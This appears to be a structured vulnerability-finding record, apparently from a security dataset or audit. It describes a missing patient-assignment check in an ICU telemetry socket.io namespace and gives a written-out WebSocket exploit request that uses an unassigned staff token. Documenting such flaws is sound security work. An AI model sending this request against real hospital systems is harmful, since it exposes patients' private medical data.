diagnosis: The ICU telemetry namespace validates that connecting sockets have general medical staff credentials, but never checks if the staff member is assigned to the patient specified in socket.nsp.name. Any doctor or nurse can connect to any patient's telemetry namespace and stream real-time physiological vitals and cardiac feeds.
exploit_request:
GET /socket.io/?EIO=4&transport=websocket HTTP/1.1
Host: icu.hospital.internal:4004
Namespace: /telemetry/patient-90184
Staff-Token: Bearer <unassigned_staff_jwt>
